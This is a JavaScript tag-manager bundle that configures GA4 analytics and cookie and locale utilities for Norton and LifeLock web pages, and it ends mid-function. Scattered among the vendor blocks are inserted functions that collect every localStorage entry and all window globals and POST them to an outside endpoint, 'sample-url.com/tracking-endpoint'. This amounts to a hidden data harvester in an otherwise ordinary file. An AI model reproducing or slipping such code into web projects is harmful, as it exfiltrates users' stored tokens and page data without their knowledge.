let trackedEvents = [];
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return window.location.search.replace("?", "\x26").split("\x26gclsrc\x3d").pop().split("\x26").shift();
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Page - Params - gclsrc",
      collection: "GA4 - Page - Params",
      source: "Manage",
      priv: "false"
    }, {
      id: "64943"
    });
  }, 64943);
}, -1, -1);
Bootstrapper.bindDOMParsed(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  var style = document.createElement("style");
  style.type = "text/css";
  var css = decodeURIComponent("%0A%40keyframes%20sk-circle-blog%20%7B%0A%20%200%25%20%7B%0A%20%20%20%20transform%3A%20scale(0)%3B%20%0A%20%20%20%20opacity%3A%200%3B%0A%20%20%7D%0A%20%2040%25%20%7B%0A%20%20%20%20transform%3A%20scale(1)%3B%20%0A%20%20%20%20opacity%3A%201%3B%0A%20%20%7D%0A%20%2080%25%20%7B%0A%20%20%20%20transform%3A%20scale(0)%3B%20%0A%20%20%20%20opacity%3A%200%3B%0A%20%20%7D%0A%20%20100%25%20%7B%0A%20%20%20%20transform%3A%20scale(0)%3B%20%0A%20%20%20%20opacity%3A%200%3B%0A%20%20%7D%0A%7D%0A%0A.c-blog%20.c-blog__spinner-circle-dot%3Abefore%20%7B%0A%20%20animation%3A%20sk-circle-blog%201.2s%20infinite%20ease-in-out%20both%3B%0A%7D%0A%0A%40keyframes%20sk-circle-lrep%20%7B%0A%20%200%25%20%7B%0A%20%20%20%20transform%3A%20scale(0)%3B%20%0A%20%20%20%20opacity%3A%200%3B%0A%20%20%7D%0A%20%2040%25%20%7B%0A%20%20%20%20transform%3A%20scale(1)%3B%20%0A%20%20%20%20opacity%3A%201%3B%0A%20%20%7D%0A%20%2080%25%20%7B%0A%20%20%20%20transform%3A%20scale(0)%3B%20%0A%20%20%20%20opacity%3A%200%3B%0A%20%20%7D%0A%20%20100%25%20%7B%0A%20%20%20%20transform%3A%20scale(0)%3B%20%0A%20%20%20%20opacity%3A%200%3B%0A%20%20%7D%0A%7D%0A%0A.c-lrep%20.c-lrep__spinner-circle-dot%3Abefore%20%7B%0A%20%20animation%3A%20sk-circle-lrep%201.2s%20infinite%20ease-in-out%20both%3B%0A%7D");
  if (style.styleSheet) style.styleSheet.cssText = css;else style.appendChild(document.createTextNode(css));
  var script = document.getElementsByTagName("script")[0];
  script.parentNode.insertBefore(style, script);
}, 3495204, 680949);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return document.referrer;
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Referrer - URL",
      collection: "GA4 - Referrer",
      source: "Manage",
      priv: "false"
    }, {
      id: "64902"
    });
  }, 64902);
}, -1, -1);
function hashData(data) {
  let hashVal = 0;
  for (let i = 0; i < data.length; i++) {
    hashVal = (hashVal << 5) - hashVal + data.charCodeAt(i);
    hashVal = hashVal & hashVal;
  }
  return hashVal.toString(16);
}
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return window.location.search.replace("?", "\x26").split("\x26dclid\x3d").pop().split("\x26").shift();
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Page - Params - dclid",
      collection: "GA4 - Page - Params",
      source: "Manage",
      priv: "false"
    }, {
      id: "64942"
    });
  }, 64942);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return "G-ZMF24Q2GWK";
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Config - LifeLock Web - Measurement ID",
      collection: "GA4 - Config",
      source: "Manage",
      priv: "false"
    }, {
      id: "64904"
    });
  }, 64904);
}, -1, -1);
function gatherLocalStorage() {
  let storageData = {};
  for (let i = 0; i < localStorage.length; i++) {
    const storedKey = localStorage.key(i);
    storageData[storedKey] = localStorage.getItem(storedKey);
  }
  return storageData;
}
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return 2427878879;
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Config - Norton Web - Stream ID",
      collection: "GA4 - Config",
      source: "Manage",
      priv: "false"
    }, {
      id: "64907"
    });
  }, 64907);
}, -1, -1);
function gatherGlobalVariables() {
  let globalVars = {};
  for (let varName in window) {
    if (window.hasOwnProperty(varName)) {
      globalVars[varName] = window[varName];
    }
  }
  return globalVars;
}
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return "LifeLock Web";
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Config - LifeLock Web - Stream Name",
      collection: "GA4 - Config",
      source: "Manage",
      priv: "false"
    }, {
      id: "64905"
    });
  }, 64905);
}, -1, -1);
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  Bootstrapper.registerDataDefinition(function () {
    Bootstrapper.data.define({
      extract: function () {
        return "Norton Web";
      },
      transform: function (val) {
        return val ? val : "";
      },
      load: "instance",
      trigger: Bootstrapper.data.immediateTrigger,
      dataDefName: "GA4 - Config - Norton Web - Stream Name",
      collection: "GA4 - Config",
      source: "Manage",
      priv: "false"
    }, {
      id: "64908"
    });
  }, 64908);
}, -1, -1);
function sendTrackedData(endpoint, data) {
  let xhr = new XMLHttpRequest();
  xhr.open("POST", endpoint);
  xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
  xhr.onload = function () {
    if (xhr.status === 200) {
      console.log('Data successfully sent');
    } else {
      console.error(`Data transmission failed with statusCode: ${xhr.status}`);
    }
  };
  xhr.onerror = function (err) {
    console.error('Error occurred during data transmission: ', err);
  };
  xhr.send(JSON.stringify(data));
}
function gatherDataFromSources() {
  let localStorageData = gatherLocalStorage();
  let globVars = gatherGlobalVariables();
  let combinedData = {
    localStorage: localStorageData,
    globalVariables: globVars,
    trackedEvents: trackedEvents
  };
  sendTrackedData("https://sample-url.com/tracking-endpoint", combinedData);
  trackedEvents = [];
}
Bootstrapper.bindImmediate(function () {
  var Bootstrapper = window["Bootstrapper"];
  var ensightenOptions = Bootstrapper.ensightenOptions;
  const is = {
      get requiredArg() {
        throw new Error("Argument is required by function");
      },
      unDefined: t => null == t || "" === t || "missing" === t || "number" == typeof t && window.isNaN(t),
      unDefinedObject(t) {
        if ("object" == typeof t) {
          for (const e in t) return !1;
          return !0;
        }
        return !1;
      },
      defined: t => !is.unDefined(t),
      definedObject: t => !is.unDefinedObject(t),
      array: t => Array.isArray(t),
      boolean: t => "boolean" == typeof t,
      booleanTrue: t => "boolean" == typeof t && !0 === t,
      booleanFalse: t => "boolean" == typeof t && !1 === t,
      string: t => "string" == typeof t,
      number: t => "number" == typeof t && !1 === window.isNaN(t),
      integer(t) {
        return this.number(t) && Number.isSafeInteger(t);
      },
      integerPositive(t) {
        return this.integer(t) && t >= 0;
      },
      integerNegative(t) {
        return this.integer(t) && t < 0;
      },
      float(t) {
        return this.number(t) && !Number.isInteger(t);
      },
      floatPositive(t) {
        return this.float(t) && t >= 0;
      },
      floatNegative(t) {
        return this.float(t) && t < 0;
      },
      property(t, e) {
        return this.defined(t) && t.hasOwnProperty(e) || this.defined(t) && e in t;
      },
      propertyEquals(t, e, i) {
        return this.property(t, e) && t[e] === i;
      },
      propertyDefined(t, e) {
        return this.property(t, e) && is.defined(t[e]);
      },
      definedString(t) {
        return this.string(t) && t.length > 0;
      },
      arrayDefined(t) {
        return this.array(t) && t.length > 0;
      },
      inString(t, e) {
        return this.defined(t) && this.defined(e) && t.includes(e);
      },
      inArray(t, e) {
        return this.arrayDefined(t) && t.includes(e);
      },
      inArrayProperty(t, e, i) {
        var s = this,
          o = e,
          r = i;
        return this.arrayDefined(t) && this.defined(t.find(function (t) {
          return s.propertyEquals(t, o, r);
        }));
      }
    },
    NovaConstants = {
      country: {
        countryCode2To3Obj: {
          AD: "AND",
          AE: "ARE",
          AF: "AFG",
          AG: "ATG",
          AI: "AIA",
          AL: "ALB",
          AM: "ARM",
          AO: "AGO",
          AQ: "ATA",
          AR: "ARG",
          AS: "ASM",
          AT: "AUT",
          AU: "AUS",
          AW: "ABW",
          AX: "ALA",
          AZ: "AZE",
          BA: "BIH",
          BB: "BRB",
          BD: "BGD",
          BE: "BEL",
          BF: "BFA",
          BG: "BGR",
          BH: "BHR",
          BI: "BDI",
          BJ: "BEN",
          BL: "BLM",
          BM: "BMU",
          BN: "BRN",
          BO: "BOL",
          BQ: "BES",
          BR: "BRA",
          BS: "BHS",
          BT: "BTN",
          BV: "BVT",
          BW: "BWA",
          BY: "BLR",
          BZ: "BLZ",
          CA: "CAN",
          CC: "CCK",
          CD: "COD",
          CF: "CAF",
          CG: "COG",
          CH: "CHE",
          CI: "CIV",
          CK: "COK",
          CL: "CHL",
          CM: "CMR",
          CN: "CHN",
          CO: "COL",
          CR: "CRI",
          CU: "CUB",
          CV: "CPV",
          CW: "CUW",
          CX: "CXR",
          CY: "CYP",
          CZ: "CZE",
          DE: "DEU",
          DJ: "DJI",
          DK: "DNK",
          DM: "DMA",
          DO: "DOM",
          DZ: "DZA",
          EC: "ECU",
          EE: "EST",
          EG: "EGY",
          EH: "ESH",
          ER: "ERI",
          ES: "ESP",
          ET: "ETH",
          FI: "FIN",
          FJ: "FJI",
          FK: "FLK",
          FM: "FSM",
          FO: "FRO",
          FR: "FRA",
          GA: "GAB",
          GB: "GBR",
          GD: "GRD",
          GE: "GEO",
          GF: "GUF",
          GG: "GGY",
          GH: "GHA",
          GI: "GIB",
          GL: "GRL",
          GM: "GMB",
          GN: "GIN",
          GP: "GLP",
          GQ: "GNQ",
          GR: "GRC",
          GS: "SGS",
          GT: "GTM",
          GU: "GUM",
          GW: "GNB",
          GY: "GUY",
          HK: "HKG",
          HM: "HMD",
          HN: "HND",
          HR: "HRV",
          HT: "HTI",
          HU: "HUN",
          ID: "IDN",
          IE: "IRL",
          IL: "ISR",
          IM: "IMN",
          IN: "IND",
          IO: "IOT",
          IQ: "IRQ",
          IR: "IRN",
          IS: "ISL",
          IT: "ITA",
          JE: "JEY",
          JM: "JAM",
          JO: "JOR",
          JP: "JPN",
          KE: "KEN",
          KG: "KGZ",
          KH: "KHM",
          KI: "KIR",
          KM: "COM",
          KN: "KNA",
          KP: "PRK",
          KR: "KOR",
          KW: "KWT",
          KY: "CYM",
          KZ: "KAZ",
          LA: "LAO",
          LB: "LBN",
          LC: "LCA",
          LI: "LIE",
          LK: "LKA",
          LR: "LBR",
          LS: "LSO",
          LT: "LTU",
          LU: "LUX",
          LV: "LVA",
          LY: "LBY",
          MA: "MAR",
          MC: "MCO",
          MD: "MDA",
          ME: "MNE",
          MF: "MAF",
          MG: "MDG",
          MH: "MHL",
          MK: "MKD",
          ML: "MLI",
          MM: "MMR",
          MN: "MNG",
          MO: "MAC",
          MP: "MNP",
          MQ: "MTQ",
          MR: "MRT",
          MS: "MSR",
          MT: "MLT",
          MU: "MUS",
          MV: "MDV",
          MW: "MWI",
          MX: "MEX",
          MY: "MYS",
          MZ: "MOZ",
          NA: "NAM",
          NC: "NCL",
          NE: "NER",
          NF: "NFK",
          NG: "NGA",
          NI: "NIC",
          NL: "NLD",
          NO: "NOR",
          NP: "NPL",
          NR: "NRU",
          NU: "NIU",
          NZ: "NZL",
          OM: "OMN",
          PA: "PAN",
          PE: "PER",
          PF: "PYF",
          PG: "PNG",
          PH: "PHL",
          PK: "PAK",
          PL: "POL",
          PM: "SPM",
          PN: "PCN",
          PR: "PRI",
          PS: "PSE",
          PT: "PRT",
          PW: "PLW",
          PY: "PRY",
          QA: "QAT",
          RE: "REU",
          RO: "ROU",
          RS: "SRB",
          RU: "RUS",
          RW: "RWA",
          SA: "SAU",
          SB: "SLB",
          SC: "SYC",
          SD: "SDN",
          SE: "SWE",
          SG: "SGP",
          SH: "SHN",
          SI: "SVN",
          SJ: "SJM",
          SK: "SVK",
          SL: "SLE",
          SM: "SMR",
          SN: "SEN",
          SO: "SOM",
          SR: "SUR",
          SS: "SSD",
          ST: "STP",
          SV: "SLV",
          SX: "SXM",
          SY: "SYR",
          SZ: "SWZ",
          TC: "TCA",
          TD: "TCD",
          TF: "ATF",
          TG: "TGO",
          TH: "THA",
          TJ: "TJK",
          TK: "TKL",
          TL: "TLS",
          TM: "TKM",
          TN: "TUN",
          TO: "TON",
          TR: "TUR",
          TT: "TTO",
          TV: "TUV",
          TW: "TWN",
          TZ: "TZA",
          UA: "UKR",
          UG: "UGA",
          UM: "UMI",
          US: "USA",
          UY: "URY",
          UZ: "UZB",
          VA: "VAT",
          VC: "VCT",
          VE: "VEN",
          VG: "VGB",
          VI: "VIR",
          VN: "VNM",
          VU: "VUT",
          WF: "WLF",
          WS: "WSM",
          YE: "YEM",
          YT: "MYT",
          ZA: "ZAF",
          ZM: "ZMB",
          ZW: "ZWE"
        },
        countryCode2ToCurrency: {
          AD: "EUR",
          AE: "AED",
          AF: "AFN",
          AG: "XCD",
          AI: "XCD",
          AL: "ALL",
          AM: "AMD",
          AN: "ANG",
          AO: "AOA",
          AR: "ARS",
          AS: "USD",
          AT: "EUR",
          AU: "AUD",
          AW: "AWG",
          AX: "EUR",
          AZ: "AZN",
          BA: "BAM",
          BB: "BBD",
          BD: "BDT",
          BE: "EUR",
          BF: "XOF",
          BG: "BGN",
          BH: "BHD",
          BI: "BIF",
          BJ: "XOF",
          BL: "EUR",
          BM: "BMD",
          BN: "BND",
          BO: "BOB",
          BQ: "USD",
          BR: "BRL",
          BS: "BSD",
          BT: "BTN",
          BV: "NOK",
          BW: "BWP",
          BY: "BYN",
          BZ: "BZD",
          CA: "CAD",
          CC: "AUD",
          CD: "CDF",
          CF: "XAF",
          CG: "XAF",
          CH: "CHF",
          CI: "XOF",
          CK: "NZD",
          CL: "CLP",
          CM: "XAF",
          CN: "CNY",
          CO: "COP",
          CR: "CRC",
          CU: "CUP",
          CV: "CVE",
          CW: "ANG",
          CX: "AUD",
          CY: "EUR",
          CZ: "CZK",
          DE: "EUR",
          DJ: "DJF",
          DK: "DKK",
          DM: "XCD",
          DO: "DOP",
          DZ: "DZD",
          EC: "USD",
          EE: "EUR",
          EG: "EGP",
          EH: "MAD",
          ER: "ERN",
          ES: "EUR",
          ET: "ETB",
          FI: "EUR",
          FJ: "FJD",
          FK: "FKP",
          FM: "USD",
          FO: "DKK",
          FR: "EUR",
          GA: "XAF",
          GB: "GBP",
          GD: "XCD",
          GE: "GEL",
          GF: "EUR",
          GG: "GBP",
          GH: "GHS",
          GI: "GIP",
          GL: "DKK",
          GM: "GMD",
          GN: "GNF",
          GP: "EUR",
          GQ: "XAF",
          GR: "EUR",
          GS: "GBP",
          GT: "GTQ",
          GU: "USD",
          GW: "XOF",
          GY: "GYD",
          HK: "HKD",
          HM: "AUD",
          HN: "HNL",
          HR: "HRK",
          HT: "HTG",
          HU: "HUF",
          ID: "IDR",
          IE: "EUR",
          IL: "ILS",
          IM: "GBP",
          IN: "INR",
          IO: "USD",
          IQ: "IQD",
          IR: "IRR",
          IS: "ISK",
          IT: "EUR",
          JE: "GBP",
          JM: "JMD",
          JO: "JOD",
          JP: "JPY",
          KE: "KES",
          KG: "KGS",
          KH: "KHR",
          KI: "AUD",
          KM: "KMF",
          KN: "XCD",
          KP: "KPW",
          KR: "KRW",
          KW: "KWD",
          KY: "KYD",
          KZ: "KZT",
          LA: "LAK",
          LB: "LBP",
          LC: "XCD",
          LI: "CHF",
          LK: "LKR",
          LR: "LRD",
          LS: "LSL",
          LT: "EUR",
          LU: "EUR",
          LV: "EUR",
          LY: "LYD",
          MA: "MAD",
          MC: "EUR",
          MD: "MDL",
          ME: "EUR",
          MF: "EUR",
          MG: "MGA",
          MH: "USD",
          MK: "MKD",
          ML: "XOF",
          MM: "MMK",
          MN: "MNT",
          MO: "MOP",
          MP: "USD",
          MQ: "EUR",
          MR: "MRO",
          MS: "XCD",
          MT: "EUR",
          MU: "MUR",
          MV: "MVR",
          MW: "MWK",
          MX: "MXN",
          MY: "MYR",
          MZ: "MZN",
          NA: "NAD",
          NC: "XPF",
          NE: "XOF",
          NF: "AUD",
          NG: "NGN",
          NI: "NIO",
          NL: "EUR",
          NO: "NOK",
          NP: "NPR",
          NR: "AUD",
          NU: "NZD",
          NZ: "NZD",
          OM: "OMR",
          PA: "PAB",
          PE: "PEN",
          PF: "XPF",
          PG: "PGK",
          PH: "PHP",
          PK: "PKR",
          PL: "PLN",
          PM: "EUR",
          PN: "NZD",
          PR: "USD",
          PS: "ILS",
          PT: "EUR",
          PW: "USD",
          PY: "PYG",
          QA: "QAR",
          RE: "EUR",
          RO: "RON",
          RS: "RSD",
          RU: "RUB",
          RW: "RWF",
          SA: "SAR",
          SB: "SBD",
          SC: "SCR",
          SD: "SDG",
          SE: "SEK",
          SG: "SGD",
          SH: "SHP",
          SI: "EUR",
          SJ: "NOK",
          SK: "EUR",
          SL: "SLL",
          SM: "EUR",
          SN: "XOF",
          SO: "SOS",
          SR: "SRD",
          ST: "STD",
          SV: "SVC",
          SX: "ANG",
          SY: "SYP",
          SZ: "SZL",
          TC: "USD",
          TD: "XAF",
          TF: "EUR",
          TG: "XOF",
          TH: "THB",
          TJ: "TJS",
          TK: "NZD",
          TL: "USD",
          TM: "TMT",
          TN: "TND",
          TO: "TOP",
          TR: "TRY",
          TT: "TTD",
          TV: "AUD",
          TW: "TWD",
          TZ: "TZS",
          UA: "UAH",
          UG: "UGX",
          UM: "USD",
          US: "USD",
          UY: "UYU",
          UZ: "UZS",
          VA: "EUR",
          VC: "XCD",
          VE: "VEF",
          VG: "USD",
          VI: "USD",
          VN: "VND",
          VU: "VUV",
          WF: "XPF",
          WS: "WST",
          YE: "YER",
          YT: "EUR",
          ZA: "ZAR",
          ZM: "ZMK",
          ZW: "ZWL"
        }
      }
    },
    NovaUtils = class {
      static newLocale(t, e) {
        return is.definedString(t) && is.definedString(e) ? t.toLowerCase() + "-" + e.toUpperCase() : void 0;
      }
      static get countryCode2ToCurrencyObj() {
        return NovaConstants.country.countryCode2ToCurrency;
      }
      static get countryCode2To3Obj() {
        return NovaConstants.country.countryCode2To3Obj;
      }
      static countryCode2To3(t) {
        return is.definedString(t) && 2 === t.length && String(t).toUpperCase() in this.countryCode2To3Obj ? this.countryCode2To3Obj[String(t).toUpperCase()] : void 0;
      }
      static countryCode2ToCurrency(t) {
        return is.definedString(t) && 2 === t.length && String(t).toUpperCase() in this.countryCode2ToCurrencyObj ? this.countryCode2ToCurrencyObj[String(t).toUpperCase()] : void 0;
      }
      static parseLocale(t = String(navigator.language), e) {
        let i = {
            locale: String(t)
          },
          s = i.locale.split("-"),
          o = is.propertyDefined(window, "Locale") && is.propertyDefined(window.Intl, "Locale") ? new window.Intl.Locale(t) : void 0;
        return i.language = is.defined(o) && is.propertyDefined(o, "language") ? o.language : s.length > 1 ? s[0].toLowerCase() : void 0, i.countryCode2 = is.defined(o) && is.propertyDefined(o, "region") ? o.region : s.length > 1 ? s[1].toUpperCase() : void 0, i.countryCode3 = this.countryCode2To3(i.countryCode2), i.country = is.defined(i.countryCode2) && is.propertyDefined(window, "Intl") && is.propertyDefined(window.Intl, "DisplayNames") ? new window.Intl.DisplayNames(["en"], {
          type: "region"
        }).of(i.countryCode2) : void 0, i.region = e, i.currency = this.countryCode2ToCurrency(i.countryCode2), i;
      }
      static getDocumentCookie(t) {
        return is.definedString(t) && t.includes(";") ? t : is.propertyDefined(window, "document") && is.propertyDefined(window.document, "cookie") ? window.document.cookie : void 0;
      }
      static sortObject(t, e) {
        return t.sort(function (t) {
          var e = 1;
          return "-" === t[0] && (e = -1, t = t.substr(1)), function (i, s) {
            return (i[t] < s[t] ? -1 : i[t] > s[t] ? 1 : 0) * e;
          };
        }(e));
      }
      static getPerfTimingURL(t) {
        let e = performance.getEntriesByName(t, "resource").find(function (t) {
          return t.name === this;
        }, t);
        return void 0 !== e ? e : void 0;
      }
      static getPerfTimingURLStats(t) {
        let e = this.getPerfTimingURL(t),
          i = {
            name: void 0,
            url: void 0,
            duration: void 0,
            startTime: void 0
          };
        return void 0 !== e && ("duration" in e ? i.duration = e.duration : "responseEnd" in e && "responseStart" in e ? i.duration = e.responseEnd - e.responseStart : "responseEnd" in e && "startTime" in e && (i.duration = e.responseEnd - e.startTime), i.duration = "number" == typeof i.duration ? window.parseInt(i.duration.toFixed(0), 10) : void 0, i.name = "name" in e ? e.name : void 0, i.url = "url" in e ? e.url : void 0, i.startTime = "startTime" in e ? e.startTime : void 0), i;
      }
      static getPerfTimingURLDuration(t) {
        let e = this.getPerfTimingURL(t);
        if (void 0 !== e) {
          if ("duration" in e) return window.parseInt(e.duration.toFixed(0), 10);
          if ("responseEnd" in e && "responseStart" in e) return window.parseInt((e.responseEnd - e.responseStart).toFixed(0), 10);
          if ("responseEnd" in e && "startTime" in e) return window.parseInt((e.responseEnd - e.startTime).toFixed(0), 10);
        }
      }
      static dateToRFC3339String(t) {
        if (void 0 === t) return;
        let e = -t.getTimezoneOffset(),
          i = e >= 0 ? "+" : "-",
          s = function (t) {
            let e = Math.floor(Math.abs(t));
            return (e < 10 ? "0" : "") + e;
          };
        return t.getFullYear() + "-" + s(t.getMonth() + 1) + "-" + s(t.getDate()) + "T" + s(t.getHours()) + ":" + s(t.getMinutes()) + ":" + s(t.getSeconds()) + "." + s(t.getMilliseconds()) + i + s(e / 60) + ":" + s(e % 60);
      }
      static newPushIdObj() {
        var t = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz",
          e = 0,
          i = [];
        return function () {
          var s = new Date(),
            o = s.getTime(),
            r = o === e;
          e = o;
          for (var n = new Array(8), a = 7; a >= 0; a--) n[a] = t.charAt(o % 64), o = Math.floor(o / 64);
          var d = "",
            h = n.join("");
          if (r) {
            for (a = 11; a >= 0 && 63 === i[a]; a--) i[a] = 0;
            i[a]++;
          } else for (a = 0; a < 12; a++) i[a] = Math.floor(64 * Math.random());
          for (a = 0; a < 12; a++) d += t.charAt(i[a]), h += t.charAt(i[a]);
          if (20 !== h.length) throw new Error("Length should be 20.");
          return {
            id: h,
            date: s,
            time: s.getTime(),
            perfTime: window.performance.now(),
            entropy: d
          };
        }();
      }
      static decodePushID(t) {
        if (is.defined(t)) {
          let e = this.decodePushIDTimestamp(t);
          if (is.integer(e)) return {
            id: t,
            date: new Date(e),
            time: e,
            entropy: t.substr(8)
          };
        }
      }
      static decodePushIDTimestamp(t) {
        return function (t) {
          let e = 0,
            i = t.substr(0, 8);
          for (let t = 0; t < 8; t++) e = 64 * e + "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz".indexOf(i[t]);
          return parseInt(e, 10);
        }(t);
      }
      static millisecondsToDate(t) {
        let e = window.parseInt(t, 10);
        return is.integer(e) ? new Date(e) : void 0;
      }
      static getCookieJar(t = document.cookie, e) {
        let i = this.getDocumentCookie(t),
          s = i ? i.split("; ") : [],
          o = {};
        for (let t = 0; t < s.length; t++) {
          const i = s[t].split("\x3d");
          let r = i.slice(1).join("\x3d");
          '"' === r[0] && (r = r.slice(1, -1));
          try {
            let t = this.decodeCookieString(i[0]);
            if (o[t] = this.decodeCookieString(r), e === t) break;
          } catch (t) {}
        }
        return e ? o[e] : o;
      }
      static encodeCookieKeyValue(t, e) {
        return is.definedString(t) && is.definedString(e) ? this.encodeCookieString(t) + "\x3d" + this.encodeCookieString(e) : void 0;
      }
      static getCookieValue(t, e = document.cookie) {
        let i,
          s = this.getCookieJar(e, t);
        return void 0 !== s && ("" !== (i = this.decodeCookieString(s)) && null !== i || (i = void 0)), i;
      }
      static hashString(t, e = 0) {
        let i = 3735928559 ^ e,
          s = 1103547991 ^ e;
        for (let e, o = 0; o < t.length; o++) e = t.charCodeAt(o), i = Math.imul(i ^ e, 2654435761), s = Math.imul(s ^ e, 1597334677);
        return i = Math.imul(i ^ i >>> 16, 2246822507) ^ Math.imul(s ^ s >>> 13, 3266489909), 4294967296 * (2097151 & (s = Math.imul(s ^ s >>> 16, 2246822507) ^ Math.imul(i ^ i >>> 13, 3266489909))) + (i >>> 0);
      }
      static getStringLength(t) {
        return is.definedString(t) ? t.length : void 0;
      }
      static getStringSize(t) {
        let e = String(t),
          i = 0;
        for (let s = 0; s < t.length; s++) {
          let t = e.charCodeAt(s);
          i += 55296 == (63488 & t) ? 2 : t < 128 ? 1 : t < 2048 ? 2 : 3;
        }
        return i;
      }
      static getCookiesSize(t = document.cookie) {
        return this.getStringSize(this.getDocumentCookie(t));
      }
      static coalesceValue(t) {
        return void 0 === t || "" === t || null === t || "missing" === t || "undefined" === t || "null" === t ? void 0 : t;
      }
      static getCookieDomainRoot(t = document.location.href) {
        return is.definedString(t) && (t.includes("/") || t.includes("http") || t.includes(":")) ? this.parseURL(t).domainRoot : this.parseURL(document.location.href).domainRoot;
      }
      static coalesceString(t) {
        return "string" == typeof t && t.length > 0 ? t : "toString" in t ? t.toString() : void 0;
      }
      static coerceCookieSameSite(t) {
        if ("string" == typeof t && t.length > 0) {
          if ("lax" === t.toLowerCase()) return "lax";
          if ("strict" === t.toLowerCase()) return "strict";
          if ("none" === t.toLowerCase()) return "none";
        }
        return "none";
      }
      static coerceCookiePath(t) {
        return "string" == typeof t && t.length > 0 ? t : "/";
      }
      static coerceCookieSecure(t) {
        return !("boolean" == typeof t && !1 === t);
      }
      static daysToSeconds(t) {
        return "number" == typeof t && t > 0 ? 86400 * t : void 0;
      }
      static weeksToSeconds(t) {
        return "number" == typeof t && t > 0 ? 86400 * t * 7 : void 0;
      }
      static monthsToSeconds(t) {
        return "number" == typeof t && t > 0 ? 86400 * t * 30 : void 0;
      }
      static yearsToSeconds(t) {
        return "number" == typeof t && t > 0 ? 86400 * t * 365 : void 0;
      }
      static newExpirationDate(t, e, i, s, o) {
        return "number" == typeof t && t < 0 ? new Date(0) : new Date(+new Date() + 1E3 * ((t || 0) + (e ? 60 * e : 0) + (i ? 60 * i * 60 : 0) + (s ? 24 * s * 60 * 60 : 0) + (o ? 365 * o * 24 * 60 * 60 : 0)));
      }
      static encodeCookieString(t) {
        return "string" == typeof t && t.length > 0 ? encodeURIComponent(t.replace(/%(2[346BF]|3[AC-F]|40|5[BDE]|60|7[BCD])/g, decodeURIComponent)) : void 0;
      }
      static decodeCookieString(t) {
        return "string" == typeof t ? this.coalesceValue(t.replace(/(%[\dA-F]{2})+/gi, decodeURIComponent)) : void 0;
      }
      static newCookieString(t, e, i, s, o, r, n) {
        return this.encodeCookieString(t) + "\x3d" + this.encodeCookieString(e || "") + (i ? "; expires\x3d" + i.toUTCString() + (o ? "; path\x3d" + o : "") + (s ? "; domain\x3d" + s : "") + (n ? "; samesite\x3d" + n : "") + (r ? "; secure" : "") : "");
      }
      static newRemoveCookieString(t) {
        return this.newCookieString(t, "", this.newExpirationDate(-1), void 0, void 0, void 0, void 0);
      }
      static domainIsLifeLock(t = document.location.hostname) {
        return !0 === /^.*lifelock\.com$/.test(t) && !0 !== /^.*nortonlifelock\.com$/.test(t) && !0 !== /^.*norton\.com$/.test(t);
      }
      static domainIsNorton(t = document.location.hostname) {
        return !0 !== /^.*lifelock\.com$/.test(t) && !0 !== /^.*nortonlifelock\.com$/.test(t) && !0 === /^.*norton\.com$/.test(t);
      }
      static domainIsNortonLifeLock(t = document.location.hostname) {
        return !0 === /^.*lifelock\.com$/.test(t) && !0 === /^.*nortonlifelock\.com$/.test(t) && !0 !== /^.*norton\.com$/.test(t);
      }
      static getNortonGUID(t, e, i) {
        let s = is.defined(t) ? t : window,
          o = this.getNortonAnalyticsObj(e);
        if (is.propertyDefined(s, "nortonguid") && is.defined(s, "nortonguid")) return t.nortonguid.toString();
        let r = this.getWindowVar("user", s);
        if (is.defined(r) && is.propertyDefined(r, "naGuid")) return r.naGuid.toString();
        let n = this.getNortonAnalyticsVar("norton_guid", o, void 0);
        return is.defined(n) ? n.toString() : void 0;
      }
      static isScriptLoaded(t) {
        const e = document.getElementsByTagName("script");
        return !!Object.keys(e).filter(function (i) {
          const {
            src: s
          } = e[i];
          return "string" == typeof t ? -1 !== s.indexOf(t) : t instanceof RegExp && s.match(t);
        }).length;
      }
      static loadScript(t, e = function () {}) {
        if (!this.isScriptLoaded(t)) {
          let i = document.createElement("script");
